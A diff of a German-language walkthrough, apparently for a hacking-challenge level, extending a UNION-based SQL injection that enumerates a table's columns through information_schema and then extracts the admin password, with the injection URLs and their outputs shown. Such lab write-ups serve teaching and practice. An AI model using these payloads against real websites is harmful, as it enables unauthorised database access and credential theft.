@@ -79,6 +79,20 @@ Den Datenbanknamen haben wir jetzt, dann kann das Schema ausgelesen werden:
 
 > Der Username lautet: user 
 
-Jetzt muss die Column herausgefunden werden:
+Jetzt müssen die Columns herausgefunden werden (LIMIT 0,1-- inkrementieren):
 
 `http://hackit.gehaxelt.in/sqli/level1.php?id=1 AND 1=5 UNION SELECT 1,column_name,3,4,5 from information_schema.columns where table_schema='level_1_jkjashd' and table_name='user' LIMIT 0,1--`
+
+>* (LIMIT 0,1--) Der Username lautet: id 
+>* (LIMIT 1,1--) Der Username lautet: username 
+>* (LIMIT 2,1--) Der Username lautet: passwort 
+>* (LIMIT 3,1--) Der Username lautet: email 
+>* (LIMIT 4,1--) Der Username lautet: admin 
+
+Zuletzt kann man nun das Passwort auslesen
+
+`http://hackit.gehaxelt.in/sqli/level1.php?id=1 AND 1=5 UNION SELECT 1,passwort,3,4,5 from level_1_jkjashd.user LIMIT 0,1--`
+
+>  Der Username lautet: me_as_a_admin 
+
+Das Passwort des Admins lautet also `me_as_a_admin`
